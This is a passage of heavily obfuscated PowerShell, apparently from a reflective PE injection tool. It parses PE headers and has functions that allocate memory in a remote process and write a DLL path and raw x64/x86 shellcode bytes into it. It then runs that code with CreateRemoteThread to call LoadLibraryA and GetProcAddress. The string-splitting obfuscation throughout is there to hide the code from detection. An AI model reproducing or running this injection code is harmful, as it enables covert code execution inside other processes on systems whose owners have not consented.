			${ntHeA`Ders`i`Nfo} | &("{2}{1}{0}" -f'er','emb','Add-M') -MemberType ("{2}{0}{1}" -f 'p','erty','NotePro') -Name ("{1}{0}" -f 'E64Bit','P') -Value ${tr`Ue}
		}
		else
		{
			${ImAG`E`Nthea`dErs32} =  (&("{1}{2}{0}" -f 'BlE','VAR','iA')  69Pb  )."V`ALUE"::"PtRtOSTru`c`TU`RE"(${NtH`EAD`eRspTr}, [Type]${WIn32`T`Y`pes}."IM`AG`E_`Nt_HEa`DeRs32")
			${NtH`eAdErS`InFo} | &("{1}{0}{2}" -f '-Membe','Add','r') -MemberType ("{3}{0}{2}{1}" -f'Pr','erty','op','Note') -Name ("{4}{1}{2}{3}{0}"-f'ERS','MAGE_NT_','HE','AD','I') -Value ${ima`ge`NTHeadE`R`s32}
			${nthEAderSI`N`Fo} | &("{0}{3}{2}{1}" -f 'Add','r','be','-Mem') -MemberType ("{3}{0}{2}{1}"-f'e','y','rt','NoteProp') -Name ("{1}{2}{0}"-f't','PE','64Bi') -Value ${fAL`Se}
		}
		
		return ${n`ThEA`d`ERSInFO}
	}



	
	Function gEt-peb`AS`Ic`INFo
	{
		Param(
		[Parameter( posItion = 0, MAnDAtorY = ${tR`UE} )]
		[Byte[]]
		${pEbY`T`eS},
		
		[Parameter(PosiTion = 1, MAndatorY = ${TR`UE})]
		[System.Object]
		${W`I`N`32TYPEs}
		)
		
		${PEIN`Fo} = &("{0}{1}{2}"-f 'New-','Objec','t') ("{1}{3}{2}{0}{4}"-f 'b','Sy','.O','stem','ject')

		
		[IntPtr]${uNmANA`Ged`P`EB`Ytes} =   (  &('gI') ('va'+'ri'+'AbLe'+':69PB') )."V`AluE"::("{3}{1}{0}{2}" -f'c','o','HGlobal','All').Invoke(${p`ebYt`ES}."LEn`G`Th")
		  (&("{2}{0}{1}" -f 'aRIA','bLE','v')  ('6'+'9PB') -vaLueo  )::("{0}{1}"-f 'Cop','y').Invoke(${P`E`ByTes}, 0, ${u`NMa`NaGed`Pe`ByTEs}, ${PeB`Yt`ES}."LE`NgTH") | &("{1}{0}{2}"-f 'ut-Nu','O','ll')
		
		
		${nTH`E`A`DERsi`NfO} = &("{5}{3}{1}{0}{4}{2}" -f'Nt','age','aders','et-Im','He','G') -PEHandle ${UnmaN`AGEdPe`B`ytEs} -Win32Types ${w`i`N32T`YPEs}
		
		
		${PEI`N`Fo} | &("{1}{0}{2}"-f'emb','Add-M','er') -MemberType ("{1}{2}{3}{0}"-f'y','NoteP','ro','pert') -Name ("{0}{2}{1}"-f'PE6','t','4Bi') -Value (${N`THeA`DER`S`InFo}."pE64B`it")
		${P`EIN`Fo} | &("{0}{1}{2}" -f'A','dd','-Member') -MemberType ("{1}{0}{2}" -f 't','No','eProperty') -Name ("{0}{3}{2}{1}{4}{5}"-f 'Origi','Image','al','n','Ba','se') -Value (${NthEa`DE`R`sInfo}."Image`_NT_h`EadE`Rs"."o`PTIon`ALheAd`er"."i`MA`Gebase")
		${peI`Nfo} | &("{2}{0}{1}"-f 'd-Membe','r','Ad') -MemberType ("{2}{0}{3}{1}"-f'oteP','rty','N','rope') -Name ("{0}{2}{1}" -f 'SizeO','age','fIm') -Value (${ntH`eAder`s`Info}."IMAGe_NT`_`h`EadERs"."OPTi`On`ALHEaDeR"."s`I`zEofImaGe")
		${P`einfO} | &("{1}{2}{0}" -f'er','Add-Mem','b') -MemberType ("{2}{0}{3}{1}" -f 'Pr','erty','Note','op') -Name ("{0}{2}{1}"-f'SizeOfH','aders','e') -Value (${nThE`AdeR`S`i`NFO}."IMagE_n`T_HEaDE`RS"."O`PtI`ONalh`eAdEr"."SIz`EoFHeade`Rs")
		${pEi`Nfo} | &("{0}{2}{1}" -f'Add-Memb','r','e') -MemberType ("{1}{0}{2}{3}"-f'P','Note','r','operty') -Name ("{0}{1}{2}{3}" -f 'DllCharact','e','rist','ics') -Value (${n`THeAdERsI`N`FO}."IMAG`E_nT_hE`A`D`erS"."o`PtIon`AlhEAdER"."dlLcha`RA`CTerIsT`Ics")
		
		
		 ${69`PB}::("{2}{3}{0}{1}"-f'loba','l','Fr','eeHG').Invoke(${u`NmA`N`AGEdPeby`TES})
		
		return ${pE`IN`Fo}
	}


	
	
	Function G`ET`-P`EdetAILed`iNFo
	{
		Param(
		[Parameter( pOSITION = 0, manDAtorY = ${T`RuE})]
		[IntPtr]
		${PEHa`NDle},
		
		[Parameter(POSitiOn = 1, MANdAtorY = ${TR`UE})]
		[System.Object]
		${W`IN32TyP`ES},
		
		[Parameter(PosITion = 2, mANDatorY = ${TR`UE})]
		[System.Object]
		${WI`N3`2CoN`sTaNtS}
		)
		
		if (${pEH`AND`lE} -eq ${NU`lL} -or ${PeH`ANDlE} -eq   (  &("{2}{1}{3}{0}"-f'aBlE','-V','geT','ARI')  ("{0}{1}" -f'2M','1aJ') -ValUE  )::"z`erO")
		{
			throw ("{7}{1}{2}{0}{8}{6}{3}{5}{4}"-f' nul','Handle i','s','tPtr.','ro','Ze',' In','PE','l or')
		}
		
		${p`E`INfO} = &("{0}{1}{2}" -f 'Ne','w-Obje','ct') ("{2}{1}{0}" -f '.Object','stem','Sy')
		
		
		${N`ThE`ADErs`I`NfO} = &("{1}{3}{2}{0}"-f's','Ge','ageNtHeader','t-Im') -PEHandle ${peha`N`dLE} -Win32Types ${Wi`N3`2types}
		
		
		${pE`IN`FO} | &("{2}{1}{0}"-f'er','-Memb','Add') -MemberType ("{1}{2}{0}"-f'ty','Not','eProper') -Name ("{1}{0}" -f 'ndle','PEHa') -Value ${Peh`An`DLe}
		${pEIN`Fo} | &("{2}{1}{0}"-f'-Member','dd','A') -MemberType ("{2}{1}{0}" -f 'rty','ePrope','Not') -Name ("{2}{0}{1}{4}{3}"-f'M','AGE','I','EADERS','_NT_H') -Value (${N`TheADE`R`sIn`FO}."ImaGE_`Nt`_heAderS")
		${PeiN`FO} | &("{2}{0}{1}"-f'emb','er','Add-M') -MemberType ("{1}{2}{0}" -f'erty','NotePro','p') -Name ("{1}{2}{3}{0}"-f'Ptr','N','tHea','ders') -Value (${ntHEA`dEr`SinFO}."ntHeAD`er`sPTr")
		${Pe`in`FO} | &("{2}{0}{1}" -f'Membe','r','Add-') -MemberType ("{0}{2}{3}{1}"-f'Note','perty','Pr','o') -Name ("{1}{0}"-f'E64Bit','P') -Value (${nt`H`eA`dEr`SINFo}."Pe64`BiT")
		${peI`N`FO} | &("{1}{2}{0}" -f 'd-Member','A','d') -MemberType ("{0}{1}{2}" -f 'NotePr','op','erty') -Name ("{2}{0}{1}" -f 'iz','eOfImage','S') -Value (${ntHea`DE`Rs`InFo}."iMaGe`_n`T`_Heade`RS"."o`PTiO`Nalh`eAdER"."s`I`zeofI`mAGe")
		
		if (${p`EInfO}."PE`64`Bit" -eq ${tR`UE})
		{
			[IntPtr]${sectI`onHEadeR`p`TR} = [IntPtr](&("{3}{4}{1}{0}{2}" -f'Uns','IntAs','igned','Ad','d-Signed') ([Int64]${PE`In`Fo}."N`THe`ADersP`TR") ( (&("{0}{1}"-f'd','Ir') ("VAR"+"ia"+"bLE:69PB"))."VAL`Ue"::"s`I`zeof"([Type]${Wi`N3`2t`YpEs}."iMAgE_nt`_heA`dE`Rs`64")))
			${pE`iN`Fo} | &("{2}{1}{0}" -f '-Member','dd','A') -MemberType ("{3}{2}{0}{1}" -f'Proper','ty','e','Not') -Name ("{0}{3}{2}{1}{4}"-f'Secti','er','d','onHea','Ptr') -Value ${sEct`i`onH`e`AderptR}
		}
		else
		{
			[IntPtr]${Se`cTio`NhEade`RP`TR} = [IntPtr](&("{0}{4}{1}{3}{5}{2}" -f'Add','ign','sUnsigned','edI','-S','ntA') ([Int64]${Pe`I`NFo}."ntH`E`A`dERSptr") (  (&("{0}{1}{2}"-f'gEt-','Va','riaBLE')  69Pb  -vaLU)::"SIZE`of"([Type]${wiN3`2TyP`Es}."imAge`_`N`T_`hEaDerS32")))
			${pei`N`Fo} | &("{3}{0}{1}{2}"-f'd-M','emb','er','Ad') -MemberType ("{3}{2}{1}{0}"-f'y','t','eProper','Not') -Name ("{0}{3}{4}{2}{1}" -f'S','aderPtr','He','ecti','on') -Value ${seC`TiONHeA`d`Erp`TR}
		}
		
		if ((${nth`EADeRSIn`Fo}."IMAG`e_NT_Head`E`Rs"."fi`lehea`DeR"."c`Ha`RaCTe`RIsT`ics" -band ${W`IN`32coNStAnts}."iMage`_`FI`lE_Dll") -eq ${wI`N3`2ConStA`N`Ts}."iM`AGe_FilE`_dlL")
		{
			${PEi`N`Fo} | &("{1}{0}{2}" -f'dd','A','-Member') -MemberType ("{0}{2}{3}{1}"-f'NoteP','ty','rope','r') -Name ("{2}{0}{1}"-f'leTy','pe','Fi') -Value 'DLL'
		}
		elseif ((${NTHEadeR`sIn`FO}."iMage`_nt_H`eaderS"."FI`leHe`ADER"."Cha`RA`cTER`I`stIcs" -band ${w`I`N32cON`ST`AnTs}."iM`AGE_Fil`E`_eX`eC`UT`ABLe_IM`AGE") -eq ${WiN32`cOn`sT`AN`Ts}."I`Ma`ge`_F`iLe_eX`E`cu`TABLe_IMAGe")
		{
			${pe`iN`Fo} | &("{0}{1}{2}" -f 'Add-','M','ember') -MemberType ("{0}{2}{1}"-f'Not','roperty','eP') -Name ("{2}{0}{1}" -f 'eTyp','e','Fil') -Value 'EXE'
		}
		else
		{
			Throw ("{6}{5}{1}{2}{7}{4}{3}{0}" -f 'L','is not',' an ','E or DL','X',' ','PE file','E')
		}
		
		return ${p`ein`Fo}
	}
	
	
	Function imP`oRT-`dL`l`InrEmO`TEPR`oc`ESs
	{
		Param(
		[Parameter(PoSItiOn=0, mANDaTory=${T`RuE})]
		[IntPtr]
		${RE`m`O`TePrOchandLE},
		
		[Parameter(PoSiTIOn=1, mANdATORY=${TR`UE})]
		[IntPtr]
		${Im`PO`Rt`DLlPATh`Ptr}
		)
		
		${PtRSI`Ze} =  ( &("{2}{0}{1}"-f'AB','le','VARi')  ('6'+'9PB')  )."va`LUE"::"sIz`e`of"([Type][IntPtr])
		
		${I`mPO`Rt`dlLPaTh} =   ( &("{1}{0}{2}"-f'It','ChiLD','EM') ("{1}{2}{0}" -f '69PB','VarIAb','le:'))."VAl`Ue"::("{4}{3}{0}{1}{2}" -f 'ri','ngA','nsi','t','PtrToS').Invoke(${iM`pOr`TDllP`AtHP`Tr})
		${dl`lpAT`Hs`IzE} = [UIntPtr][UInt64]([UInt64]${I`MP`or`TDlLPaTH}."l`eNGTH" + 1)
		${Rim`P`o`RTd`LLPATHp`Tr} = ${win3`2`Fu`NCT`IOns}."V`IRtUAl`A`l`LOcEx"."iNvO`kE"(${R`Emo`TEPro`chAnDle},  ( &("{0}{1}" -f'VAriABL','E')  ("{0}{1}" -f'2m1','Aj'))."VA`lUe"::"Ze`Ro", ${d`l`LpaThs`ize}, ${wIN32C`o`Ns`Ta`NTs}."Me`m`_cOmMiT" -bor ${WIn32cO`NS`TaN`TS}."M`EM`_rESErvE", ${Win32COns`T`A`N`Ts}."pAge_r`E`A`dwRite")
		if (${RI`Mpo`RtD`llPAtHPtr} -eq   ( &("{1}{0}" -f 'r','dI')  ("{3}{1}{0}{2}"-f'2','arIaBle:','m1aj','v') )."va`LUE"::"Ze`RO")
		{
			Throw ("{5}{7}{4}{1}{8}{2}{3}{6}{0}"-f'ss','cate mem','ry in ','the r','lo','Unable to a','emote proce','l','o')
		}

		[UIntPtr]${Nu`MbYt`e`SwRiT`TEn} =  ${v`1B}::"Z`eRO"
		${s`UcCeSS} = ${wI`N32FUnct`iONs}."Writ`ep`R`oCeSsMEmO`RY"."IN`VO`Ke"(${REM`OT`EPrOC`hAND`Le}, ${RimpO`RT`Dl`LpA`T`HPtR}, ${I`mPo`Rt`D`LlpAThptr}, ${DllPAt`h`s`ize}, [Ref]${NU`MB`YtEs`W`RitTEN})
		
		if (${S`UCC`ess} -eq ${f`AlSE})
		{
			Throw ("{6}{2}{3}{1}{0}{4}{7}{5}{8}"-f 'ath','p','nable to writ','e DLL ',' to ','emote proce','U','r','ss memory')
		}
		if (${D`LLPat`HS`IzE} -ne ${NuMBy`TE`swrItT`EN})
		{
			Throw ((("{8}{3}{5}{12}{1}{10}{11}{2}{14}{18}{15}{4}{13}{6}{16}{9}{0}{7}{19}{17}"-f 'o the r','ite the ex','amount of byt','idn','LL p','ZK1','o load','emot','D','t','pecte','d ','t wr','ath t','es wh','ing a D',' ','ss','en writ','e proce'))-RepLace  'ZK1',[cHaR]39)
		}
		
		${keRnE`l32h`ANDLe} = ${Win32`FU`Nc`Ti`Ons}."ge`T`M`oDULeHAndle"."iN`VoKE"(("{3}{2}{1}{0}" -f 'dll','2.','el3','kern'))
		${l`o`ADliBrARY`AADDR} = ${wIn`3`2`FUNct`ions}."gEtprOC`AD`DreSS"."in`V`OKe"(${KErNeL`32`H`ANDle}, ("{1}{2}{3}{0}" -f 'A','Load','Librar','y')) 
		
		[IntPtr]${DL`Lad`Dr`ESs} =   ${2`m1Aj}::"Z`eRo"
		
		
		if (${PE`i`NfO}."PE6`4bIT" -eq ${T`RUE})
		{
			
			${LOa`DliBRa`Ry`A`Re`TmEm} = ${wIn32f`U`NC`TI`ons}."V`IrTUALaL`LoC`EX"."i`NVOkE"(${REM`oTEpr`OC`hAND`le},   ( &('Ls')  ("{2}{0}{1}" -f'Ab','LE:2M1aj','VARi')  )."Va`Lue"::"z`ErO", ${DLlP`A`T`HSIze}, ${wIn`3`2cOnsTa`Nts}."M`e`m_COMMIt" -bor ${wIN32`cOn`ST`ANts}."mEm_`ReSe`RvE", ${w`i`N32COns`TANTs}."PAG`e`_reaDW`RiTE")
			if (${lOAd`LIbRarY`Aretm`EM} -eq   (&("{0}{1}"-f 'vAria','ble')  ("2m1"+"aJ") -vaLUEonl)::"Ze`Ro")
			{
				Throw ("{2}{10}{9}{1}{6}{13}{16}{15}{5}{3}{11}{12}{14}{17}{7}{0}{8}{4}"-f 'd',' memor','Un','ote pro','raryA','e rem','y ','a','Lib','llocate','able to a','ces','s','in',' for the return value o','h',' t','f Lo')
			}
			
			
			
			${l`o`ADlIBra`Rysc1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${LOadlIb`Rar`Y`s`C2} = @(0x48, 0xba)
			${L`oA`dlIbraR`YS`c3} = @(0xff, 0xd2, 0x48, 0xba)
			${Lo`ADlIbr`A`RySC4} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
			
			${s`cLeng`Th} = ${lOaDl`I`BRa`Ry`sc1}."l`enG`Th" + ${lOA`dl`i`BRARysc2}."le`N`GtH" + ${LOAd`l`IB`RARYs`c3}."lEN`gth" + ${lo`ADl`i`BRArY`SC4}."l`enGTh" + (${P`T`RsiZE} * 3)
			${Sc`Ps`MeM} =  ${6`9pb}::("{0}{2}{3}{1}" -f'Alloc','al','HG','lob').Invoke(${S`clE`N`GtH})
			${sC`p`S`MemorIGin`AL} = ${sC`PSm`Em}
			
			&("{0}{3}{4}{1}{2}" -f 'W','tes','ToMemory','rit','e-By') -Bytes ${lOaDlib`R`ARysC1} -MemoryAddress ${Sc`P`Smem}
			${S`C`PsmEM} = &("{0}{6}{4}{1}{2}{5}{3}"-f 'A','gnedIntAsU','nsig','d','Si','ne','dd-') ${Scps`mem} (${loaDLibrAr`Y`sC1}."LENg`Th")
			 ( &('gI') ("VA"+"r"+"iab"+"lE:69PB")  )."VAl`Ue"::("{0}{1}{4}{2}{3}" -f 'Struct','ure','t','r','ToP').Invoke(${rIMP`OR`TDL`lpAt`hpTR}, ${ScP`sMEm}, ${F`Al`sE})
			${s`C`PsmEM} = &("{3}{1}{4}{0}{5}{2}"-f't','dd-S','nsigned','A','ignedIn','AsU') ${scPs`mEM} (${ptrs`IZE})
			&("{2}{4}{1}{5}{3}{0}" -f'ry','Byte','Wri','o','te-','sToMem') -Bytes ${L`O`Adlibr`AR`Ysc2} -MemoryAddress ${Scpsm`EM}
			${sc`pS`mem} = &("{6}{5}{1}{0}{4}{2}{3}"-f'nedIntA','g','nsig','ned','sU','Si','Add-') ${scPS`m`em} (${L`OA`DlIbr`ArYsc2}."LeNG`Th")
			  ( &("{1}{0}" -f 'cI','G')  ('VaR'+'i'+'a'+'blE:69Pb') )."VAL`Ue"::("{0}{2}{3}{1}" -f 'Structur','oPtr','e','T').Invoke(${Loa`D`liB`RARYaA`DDr}, ${SC`P`SMeM}, ${F`AlSe})
			${S`C`PSMeM} = &("{2}{1}{4}{3}{0}"-f 'IntAsUnsigned','ig','Add-S','ed','n') ${s`cpS`MEM} (${P`TrSIZE})
			&("{2}{3}{4}{0}{1}{5}"-f'm','o','Wri','te-By','tesToMe','ry') -Bytes ${LOADL`Ib`RaRySC3} -MemoryAddress ${s`CpsM`EM}
			${Sc`PSM`em} = &("{0}{3}{5}{1}{2}{6}{7}{4}" -f 'Ad','d','Int','d','ed','-Signe','As','Unsign') ${S`c`pSMEM} (${l`oadLIBrar`yS`C3}."Le`Ng`Th")
			 (&("{1}{0}{3}{2}"-f 'h','gEt-C','lDITEM','i') ("{1}{0}{3}{4}{2}" -f'arIAB','v','9pB','LE:','6'))."V`AlUe"::("{0}{4}{3}{2}{1}" -f 'St','tr','P','tureTo','ruc').Invoke(${L`o`ADL`iB`RaR`yARe`TmEm}, ${sC`PSm`em}, ${fal`Se})
			${sc`p`SMEM} = &("{1}{4}{3}{2}{0}"-f'igned','Add','ns','ignedIntAsU','-S') ${s`CpS`mEm} (${PTRs`I`ZE})
			&("{4}{0}{2}{3}{1}"-f'te-B','ory','yte','sToMem','Wri') -Bytes ${l`OaD`LibraR`Y`Sc4} -MemoryAddress ${SC`p`sMEM}
			${S`c`PSmem} = &("{3}{4}{6}{0}{2}{1}{5}"-f 'edI','Unsig','ntAs','Ad','d-','ned','Sign') ${S`cP`SmeM} (${LoA`DLI`B`RARySC4}."L`e`NGTh")

			
			${rscaD`Dr} = ${WiN`3`2`FUNC`TIOnS}."virtuaLa`lLo`c`Ex"."iNVo`kE"(${rEM`OTEPr`o`ChaN`DlE},   (  &("{0}{1}" -f'dI','r')  ("VA"+"RiaBl"+"e:2M1AJ")  )."Va`luE"::"Z`Ero", [UIntPtr][UInt64]${s`ClEnG`TH}, ${WiN32c`o`NStA`N`Ts}."Me`M_`cOmM`it" -bor ${WI`N3`2con`sT`AnTs}."m`Em`_`ResErve", ${W`iN32coN`S`TA`NtS}."P`A`GE_E`XeCU`TE_REadWr`I`Te")
			if (${rs`CaD`dr} -eq   ${2`m`1Aj}::"ZE`RO")
			{
				Throw ("{3}{6}{11}{5}{0}{7}{17}{14}{4}{16}{8}{2}{18}{9}{12}{15}{13}{1}{10}" -f'o all','lco','n the remot','Una','ry',' t','bl','ocate','i','pro','de','e','cess for','shel','mo',' ',' ',' me','e ')
			}
			
			${su`CC`ESS} = ${wIN32`FU`N`CTioNs}."wRItep`ROCESs`mEM`O`Ry"."i`NvOke"(${re`MoT`E`prOCha`NDlE}, ${R`sc`ADdR}, ${SCP`s`MEmoRIG`INAL}, [UIntPtr][UInt64]${sc`l`enGTH}, [Ref]${N`UMBYTES`WRi`TtEn})
			if ((${s`UCC`EsS} -eq ${F`Al`Se}) -or ([UInt64]${NumByTE`s`WR`I`T`TEN} -ne [UInt64]${S`cL`enGTH}))
			{
				Throw ("{3}{10}{2}{1}{6}{8}{5}{7}{0}{11}{9}{4}" -f'ce','le to write','b','Un','.','e to remo',' shell','te pro','cod','mory','a','ss me')
			}
			
			${RtH`RE`AdhAND`lE} = &("{3}{2}{4}{0}{1}" -f'ote','Thread','R','Create-','em') -ProcessHandle ${reM`O`TeProc`handlE} -StartAddress ${RsC`AdDR} -Win32Functions ${wIN32fUNCT`Io`Ns}
			${r`Es`UlT} = ${Win`3`2fUNCt`i`ons}."w`A`It`ForSInG`L`eobJeCt"."IN`VOkE"(${rtHre`AD`ha`NdLE}, 20000)
			if (${res`ULT} -ne 0)
			{
				Throw ("{5}{11}{7}{0}{2}{6}{10}{12}{13}{3}{8}{9}{4}{1}" -f'Cre','iled.','a','roc','fa','Call t','te',' ','Address',' ','Rem','o','oteThread to c','all GetP')
			}
			
			
			[IntPtr]${reT`UR`NVa`Lm`eM} =  ${6`9PB}::("{3}{2}{1}{0}" -f 'bal','HGlo','loc','Al').Invoke(${P`TrsI`ZE})
			${r`eS`UlT} = ${wIN32`F`UNCtio`NS}."ReaDPRo`cE`sSM`eM`oRy"."In`V`OKE"(${r`eMoTeP`Ro`chAnDlE}, ${lO`ADLibRar`Ya`RetMEm}, ${retUrn`V`AL`m`eM}, [UIntPtr][UInt64]${pt`R`Size}, [Ref]${nUm`ByTES`WR`I`TTEN})
			if (${R`eSULT} -eq ${FAL`SE})
			{
				Throw ("{4}{5}{6}{1}{2}{3}{0}"-f'd','P','roce','ssMemory faile','C','all to R','ead')
			}
			[IntPtr]${D`llad`DrE`Ss} =   ${6`9PB}::"pT`Rtos`TRUcTure"(${Ret`URn`VaLm`eM}, [Type][IntPtr])

			${w`IN3`2funCT`IO`NS}."virTUa`lF`REe`eX"."inv`Oke"(${r`E`mOT`EpRocHANdLE}, ${lO`ADlIBR`ArYAret`m`EM}, [UIntPtr][UInt64]0, ${win32`cONSTA`NTs}."meM`_`RelE`ASe") | &("{1}{0}{2}"-f 't','Ou','-Null')
			${wI`N32`FuNC`TIoNS}."vi`RTua`lF`REeEX"."inv`Oke"(${Remot`E`PR`O`CHAND`Le}, ${rScA`d`dr}, [UIntPtr][UInt64]0, ${WIN`32cOn`stanTs}."meM`_Relea`se") | &("{0}{1}{2}" -f 'Out-','N','ull')
		}
		else
		{
			[IntPtr]${rT`hr`EaDhaN`dLE} = &("{1}{5}{0}{2}{4}{3}"-f 'ote','Create-R','Thr','d','ea','em') -ProcessHandle ${REMo`Te`PRocHA`Nd`Le} -StartAddress ${Lo`A`dLIBR`A`RyaAD`dR} -ArgumentPtr ${ri`MpOR`TDl`L`PAth`pTR} -Win32Functions ${WIN32`F`UNCtI`ons}
			${RES`U`Lt} = ${win`3`2f`UnC`TiONS}."Wai`Tf`O`RsIngLE`OBJecT"."i`Nv`OKE"(${R`T`hREaDha`Ndle}, 20000)
			if (${r`e`SUlT} -ne 0)
			{
				Throw ("{9}{6}{10}{5}{8}{2}{4}{0}{3}{1}{7}" -f 'teThread to call Get','ocAddress fa','teRem','Pr','o','e',' to C','iled.','a','Call','r')
			}
			
			[Int32]${EX`itc`oDE} = 0
			${rE`S`Ult} = ${win`32`FUn`cT`ionS}."gE`T`EXi`TCOdETHreAd"."In`VOke"(${rThre`A`dHan`d`lE}, [Ref]${exIT`C`OdE})
			if ((${reS`ULt} -eq 0) -or (${E`xI`T`cODE} -eq 0))
			{
				Throw ("{7}{0}{1}{5}{4}{2}{6}{3}"-f'o GetExitCodeTh','re','fa','ed',' ','ad','il','Call t')
			}
			
			[IntPtr]${dLL`A`DdReSs} = [IntPtr]${eXITco`dE}
		}
		
		${w`In3`2F`UNctIoNS}."VIRtual`FR`e`Eex"."invo`kE"(${reMotE`PRo`Ch`And`LE}, ${Ri`m`portdL`lPaT`hpTr}, [UIntPtr][UInt64]0, ${w`I`N32`c`OnstANts}."MEm_R`el`e`ASE") | &("{1}{0}" -f 't-Null','Ou')
		
		return ${Dl`LadDre`sS}
	}
	
	
	Function G`E`T-R`EM`Otepr`ocAdd`Ress
	{
		Param(
		[Parameter(pOsItiOn=0, MaNdaTory=${T`RUE})]
		[IntPtr]
		${r`EMotePRO`C`h`ANDlE},
		
		[Parameter(POSiTION=1, maNDATOry=${tr`UE})]
		[IntPtr]
		${rE`MotED`LLHA`N`Dle},
		
		[Parameter(poSitioN=2, MAndATOrY=${tr`Ue})]
		[IntPtr]
		${F`UNcTI`o`NNA`MEP`TR},

        [Parameter(POsItIOn=3, manDatoRY=${tr`UE})]
        [Bool]
        ${Loadb`Yor`D`in`Al}
		)

		${P`Trs`IZE} =  ( &("{0}{1}" -f'i','TeM')  ("{0}{1}{2}"-f'varIab','l','e:69pb')  )."Val`UE"::"si`ZE`OF"([Type][IntPtr])

		[IntPtr]${rFun`CnAm`EpTR} =   (&("{0}{1}" -f 'GET-I','tEm')  ('va'+'riaBle:2'+'M1aJ'))."val`UE"::"Z`ERO"   
        
        if (-not ${lOa`DbYORDi`NaL})
        {
        	${fUncTIOn`N`AmE} =   ( &("{3}{0}{1}{2}"-f 'e','t-v','ARIAblE','G') 69PB  )."vaL`UE"::("{0}{3}{2}{1}" -f 'P','ringAnsi','oSt','trT').Invoke(${fUn`CT`iO`NnaMe`ptr})

		    
		    ${f`UNCTioN`N`AMESIZE} = [UIntPtr][UInt64]([UInt64]${FU`NCT`Ion`NAME}."LeNg`TH" + 1)
		    ${RfUNCN`A`mEPTR} = ${WIN`32FUnc`Ti`o`NS}."vir`TUal`A`LlOc`EX"."iNVo`ke"(${Re`MOte`prOCH`An`DlE},   ${2`m`1aJ}::"Z`erO", ${f`UNctI`onn`AmE`S`iZe}, ${W`iN`32con`STaNTS}."m`eM`_com`Mit" -bor ${WiN32c`ON`STa`NTs}."mem`_re`Ser`VE", ${W`IN32cO`Nsta`N`Ts}."p`AGe_r`EAD`Wr`ItE")
		    if (${RFUN`c`NAmep`TR} -eq   (&("{1}{0}" -f'bLE','vaRIa')  ('2m'+'1aj')  -Va )::"ze`RO")
		    {
			    Throw ("{7}{1}{2}{5}{8}{3}{9}{4}{0}{6}" -f'e','able',' to allocate','t','e remot',' me',' process','Un','mory in ','h')
		    }

		    [UIntPtr]${num`B`YtEswriTten} =   (  &("{1}{0}{2}" -f'et-vaRiA','G','BLe') ("V1"+"B") -VAluEoNLy)::"zE`Ro"
		    ${suC`CESs} = ${wi`N32fuN`cT`IoNS}."wRIT`eprO`C`ESsmE`MoRy"."iNv`Oke"(${r`emOtePR`oChaN`DLE}, ${RfUNcN`A`m`e`PTr}, ${F`U`NCT`I`oNNAMePTr}, ${FU`NC`Ti`ON`NAmeSIZE}, [Ref]${nu`mB`Y`TeSW`RiTtEN})
		    if (${SU`CC`EsS} -eq ${F`ALse})
		    {
			    Throw ("{3}{6}{9}{7}{2}{0}{5}{8}{1}{4}"-f 'e pr','memo','path to remot','Una','ry','ocess','ble to wri',' ',' ','te DLL')
		    }
		    if (${FUnC`Ti`OnNam`Es`IzE} -ne ${N`U`mB`YteSWrit`TeN})
		    {
			    Throw ((("{4}{15}{8}{21}{16}{2}{5}{11}{19}{13}{1}{6}{20}{0}{7}{14}{10}{17}{18}{12}{9}{3}" -f 'g a',' when w',' ','te process','Di','amount','riti',' DL','MFt write t','o',' pa',' of b','to the rem','es','L','dnS','e expected','th to lo','ad ','yt','n','h'))."rep`La`ce"(([cHAr]83+[cHAr]77+[cHAr]70),[StRING][cHAr]39))
		    }
        }
        
        else
        {
            ${RFU`N`Cnam`Ep`Tr} = ${funcTIon`NA`M`eP`Tr}
        }
		
		
		${KeRNel3`2hA`N`D`LE} = ${W`In32`F`Un`cTIONs}."gETMoDuL`eh`An`DlE"."iNV`oke"(("{0}{2}{1}{3}" -f'ke','d','rnel32.','ll'))
		${gEtP`Ro`caDDR`ES`sa`ddR} = ${wiN32fuNC`T`iOns}."G`ETp`ROc`Addr`EsS"."InVO`Ke"(${kernEl`32h`A`ND`lE}, ("{1}{0}{2}{3}" -f'etProcAddr','G','es','s')) 

		
		
		${GetpR`o`c`ADD`ReSS`Retm`EM} = ${Wi`N`32FuNCt`I`ONS}."v`iR`Tu`ALALLoC`eX"."I`N`Voke"(${REmOT`ep`R`ocHAndLE},  (&("{1}{0}" -f 'i','gc') ("VaR"+"I"+"a"+"bLe:2M"+"1aj")  )."V`AluE"::"z`Ero", [UInt64][UInt64]${p`TRs`iZe}, ${wIn32`ConsT`A`N`TS}."mEM_c`oM`miT" -bor ${W`I`N32coNsTAnTs}."MEM_`ReSEr`Ve", ${wIn`32C`onst`AnTs}."Page_rEAd`wr`ite")
		if (${Get`P`R`OcadDREsSreT`m`EM} -eq   (&('LS')  ("{1}{3}{2}{0}{4}" -f'1','vaRi','2M','AbLE:','aJ') )."VA`lUE"::"zE`Ro")
		{
			Throw ("{16}{21}{12}{20}{17}{19}{15}{1}{11}{3}{9}{18}{2}{22}{13}{5}{0}{8}{7}{10}{14}{6}{4}"-f'lue o','e','retu',' process','s','va','s','Get','f ',' for t','Proc',' remote','a','n ','Addre','ory in th','Unable ','e me','he ','m','llocat','to ','r')
		}
		
		
		
		
		[Byte[]]${Ge`T`PRocADdrEs`s`SC} = @()
		if (${P`Ei`NFO}."p`E6`4bit" -eq ${T`Rue})
		{
			${GET`P`R`ocaDDresSsC1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			${G`e`T`PRoc`AdDrESSS`C2} = @(0x48, 0xba)
			${G`etprocAddrES`SS`C3} = @(0x48, 0xb8)
			${GEtp`RoCaDd`RES`s`Sc4} = @(0xff, 0xd0, 0x48, 0xb9)
			${gETp`RO`caDdR`eS`SS`C5} = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			${geTPRo`CaDdR`eS`sS`C1} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			${GE`Tpr`o`CaddReSSS`c2} = @(0xb9)
			${gEtPROCaD`d`Res`s`S`C3} = @(0x51, 0x50, 0xb8)
			${GEt`p`ROcAdDReS`SS`C4} = @(0xff, 0xd0, 0xb9)
			${gE`TprOcAdDRES`ss`C5} = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
